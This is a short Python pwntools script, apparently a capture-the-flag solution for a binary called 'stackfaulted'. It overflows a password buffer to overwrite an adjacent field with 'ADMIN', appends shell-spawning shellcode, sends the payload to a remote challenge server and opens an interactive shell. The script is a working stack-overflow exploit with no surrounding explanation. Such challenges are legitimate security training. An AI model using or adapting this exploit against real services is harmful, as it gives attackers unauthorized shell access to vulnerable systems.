from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('./stackfaulted')

payload = b'verySecurePassword123\x00'
payload = payload.ljust(40, b'A')
payload += b'ADMIN'
payload += b'\x00' * 3
payload += asm(shellcraft.sh())
print(asm(shellcraft.sh()))

print(bytes(payload))

open('payload', 'wb').write(payload)

p = remote('tcp.ybn.sg', 24739)

p.sendlineafter('password: \n', payload)

print(p.recvline())
p.interactive()
